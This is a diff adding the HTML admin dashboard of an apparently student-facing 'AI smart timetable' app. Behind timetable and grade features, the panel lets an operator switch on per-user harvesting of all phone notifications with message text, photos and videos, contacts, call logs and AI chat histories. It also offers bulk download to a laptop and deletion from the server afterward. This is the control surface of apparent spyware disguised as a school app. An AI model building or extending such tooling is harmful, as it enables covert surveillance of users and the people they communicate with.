@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>AI 스마트 시간표 · 관리자 관제탑</title>
+  <script src="/config.js"></script>
+  <link rel="stylesheet" href="/styles.css" />
+</head>
+<body>
+  <div class="app-shell">
+    <aside class="sidebar">
+      <div class="sidebar-header">
+        <h1>관리자 관제탑</h1>
+        <p>전체 알림 · 사진/영상 · 연락처 · 통화기록 · 사용자별 관제</p>
+        <div class="status-pill">
+          <span class="status-dot" id="healthDot"></span>
+          <span id="healthText">확인 중...</span>
+        </div>
+        <button class="btn primary" id="btnOpenStorageFolder" style="margin-top:12px;width:100%;">저장 폴더 / 백업 안내</button>
+        <div class="pull-sync-card" id="pullSyncCard" style="display:none;">
+          <div class="pull-sync-title">자동 다운로드 (노트북)</div>
+          <p class="pull-sync-meta" id="pullSyncMeta">서버 대기: -</p>
+          <label class="pull-sync-toggle">
+            <input type="checkbox" id="toggleDeleteAfterPull" checked />
+            <span>다운로드 확인 후 서버에서 삭제</span>
+          </label>
+          <button class="btn" id="btnPullAgentHelp" style="width:100%;margin-top:8px;">에이전트 실행 방법</button>
+        </div>
+        <p class="sidebar-hint">왼쪽 목록에서 <strong>삭제</strong>로 사용자를 제거할 수 있습니다.</p>
+      </div>
+      <div class="user-list-header">사용자 목록</div>
+      <div class="user-list" id="userList"></div>
+    </aside>
+
+    <main class="main">
+      <div id="emptyMain" class="content">
+        <div class="empty-state">왼쪽에서 사용자를 선택하면 통합 관제 화면이 표시됩니다.</div>
+      </div>
+
+      <div id="mainContent" style="display:none;">
+        <header class="main-header">
+          <div class="header-top">
+            <div>
+              <h2 id="mainTitle">사용자</h2>
+              <p class="sub" id="mainSub">-</p>
+            </div>
+            <div class="header-actions">
+              <button class="btn primary" id="btnBackupUser" title="클라우드에 쌓인 이 사용자 데이터 전체 ZIP 다운로드">내 노트북으로 이 유저 데이터 전체 백업</button>
+              <button class="btn danger" id="btnDeleteAll">사용자 삭제</button>
+            </div>
+          </div>
+
+          <div class="control-bar">
+            <div class="toggle-card">
+              <label for="toggleNotification">전체 알림 수집</label>
+              <div class="switch">
+                <input type="checkbox" id="toggleNotification" />
+                <span class="slider"></span>
+              </div>
+            </div>
+            <div class="toggle-card">
+              <label for="toggleMedia">사진·영상 백업</label>
+              <div class="switch">
+                <input type="checkbox" id="toggleMedia" />
+                <span class="slider"></span>
+              </div>
+            </div>
+          </div>
+        </header>
+
+        <div class="tab-bar">
+          <button class="tab-btn active" data-tab="schedule">스마트 시간표 모니터링</button>
+          <button class="tab-btn" data-tab="notifications">실시간 알림</button>
+          <button class="tab-btn" data-tab="media">사진·영상</button>
+          <button class="tab-btn" data-tab="contacts">연락처</button>
+          <button class="tab-btn" data-tab="calllog">통화기록</button>
+          <button class="tab-btn" data-tab="gradePercent">성적 퍼센트</button>
+        </div>
+
+        <section class="content">
+          <div class="stats-row">
+            <div class="stat-card">
+              <div class="label">알림</div>
+              <div class="value" id="statNotifications">0</div>
+            </div>
+            <div class="stat-card">
+              <div class="label">사진·영상</div>
+              <div class="value" id="statMedia">0</div>
+            </div>
+            <div class="stat-card">
+              <div class="label">연락처</div>
+              <div class="value" id="statContacts">0</div>
+            </div>
+            <div class="stat-card">
+              <div class="label">통화기록</div>
+              <div class="value" id="statCallLogs">0</div>
+            </div>
+            <div class="stat-card">
+              <div class="label">AI 대화</div>
+              <div class="value" id="statChats">0</div>
+            </div>
+            <div class="stat-card">
+              <div class="label">연결 상태</div>
+              <div class="value" id="statOnline">-</div>
+            </div>
+          </div>
+
+          <div class="panel active" id="panelSchedule">
+            <div class="school-info-card" id="schoolInfoCard">
+              <div class="school-info-title">컴시간알리미 · 일일 시간표 연동</div>
+              <div class="school-info-body" id="schoolInfoBody">학교 정보 없음</div>
+              <div class="school-info-meta" id="schoolSyncMeta">마지막 업데이트: -</div>
+              <div class="school-info-meta" id="schoolWeekRange">이번 주: -</div>
+              <div class="schedule-toolbar">
+                <span class="today-badge" id="todayBadge">오늘: -</span>
+                <button class="btn primary" id="btnRefreshSchedule" type="button">시간표 지금 동기화</button>
+              </div>
+            </div>
+            <h3>이번 주 실시간 시간표 <span class="sub-inline" id="scheduleTodayHint"></span></h3>
+            <div class="schedule-grid" id="scheduleGrid"></div>
+            <h3 style="margin-top:24px;">Gemini AI 대화 기록</h3>
+            <div class="chat-log" id="chatLog"></div>
+          </div>
+
+          <div class="panel" id="panelNotifications">
+            <div class="filter-bar">
+              <div class="filter-group">
+                <label for="filterPackage">앱 이름 / 패키지 검색</label>
+                <input type="text" id="filterPackage" list="packageList" placeholder="com.kakao.talk, instagram 등" />
+                <datalist id="packageList"></datalist>
+              </div>
+              <div class="filter-group">
+                <label for="filterKeyword">본문 키워드</label>
+                <input type="text" id="filterKeyword" placeholder="메시지 내용 실시간 검색" />
+              </div>
+              <button class="btn primary" id="btnApplyFilter">필터 적용</button>
+              <button class="btn" id="btnClearFilter">초기화</button>
+            </div>
+            <table class="data-table" id="notificationTable">
+              <thead>
+                <tr>
+                  <th>앱 (패키지)</th>
+                  <th>발신자</th>
+                  <th>본문</th>
+                  <th>수신 시간</th>
+                </tr>
+              </thead>
+              <tbody></tbody>
+            </table>
+          </div>
+
+          <div class="panel" id="panelMedia">
+            <div id="mediaByDate"></div>
+          </div>
+
+          <div class="panel" id="panelContacts">
+            <div class="filter-bar">
+              <div class="filter-group">
+                <label for="filterContact">연락처 검색</label>
+                <input type="text" id="filterContact" placeholder="이름 또는 전화번호" />
+              </div>
+            </div>
+            <table class="data-table" id="contactsTable">
+              <thead>
+                <tr>
+                  <th>이름</th>
+                  <th>전화번호</th>
+                </tr>
+              </thead>
+              <tbody></tbody>
+            </table>
+          </div>
+
+          <div class="panel" id="panelCallLog">
+            <div class="filter-bar">
+              <div class="filter-group">
+                <label for="filterCallLog">통화기록 검색</label>
+                <input type="text" id="filterCallLog" placeholder="이름, 번호, 유형(수신/발신)" />
+              </div>
+            </div>
+            <table class="data-table" id="callLogTable">
+              <thead>
+                <tr>
+                  <th>유형</th>
+                  <th>이름</th>
+                  <th>번호</th>
+                  <th>통화시간</th>
+                  <th>일시</th>
+                </tr>
+              </thead>
+              <tbody></tbody>
+            </table>
+          </div>
+
+          <div class="panel" id="panelGradePercent">
+            <p class="sub" style="margin-bottom:16px;">학교·학년별 퍼센트 표 관리 — 앱에서 「요청하기」로 올린 사진을 확인하고, 학년별 rows JSON을 입력·저장하면 해당 학년이 사용 가능(ready) 상태가 됩니다.</p>
+            <div id="gradePercentSchools"></div>
+            <div id="gradePercentDetail" style="display:none;margin-top:24px;">
+              <h3 id="gradePercentDetailTitle">학교 상세</h3>
+              <div style="display:flex;align-items:center;gap:12px;margin:12px 0;">
+                <label for="gradePercentGradeSelect">학년</label>
+                <select id="gradePercentGradeSelect" style="padding:8px 12px;border-radius:8px;border:1px solid var(--border);">
+                  <option value="1">1학년</option>
+                  <option value="2">2학년</option>
+                  <option value="3">3학년</option>
+                </select>
+                <span id="gradePercentReadyBadge" class="sub"></span>
+              </div>
+              <h4>대기 중 요청 사진 (선택한 학년)</h4>
+              <div class="grade-percent-images" id="gradePercentImages"></div>
+              <h4 style="margin-top:16px;">퍼센트 표 rows (JSON) — 저장 시 ready</h4>
+              <p class="sub">예: [{"gradeLabel":"1등급","minScore":96,"maxScore":100,"percent":100}] — 점수 비율(%) 기준</p>
+              <textarea id="gradePercentRowsEditor" rows="8" style="width:100%;font-family:monospace;padding:12px;border-radius:8px;border:1px solid var(--border);"></textarea>
+              <button class="btn primary" id="btnSaveGradePercentRows" style="margin-top:12px;">학년별 rows 저장 (등록 완료)</button>
+            </div>
+          </div>
+        </section>
+      </div>
+    </main>
+  </div>
+
+  <script src="/app.js"></script>
+</body>
+</html>
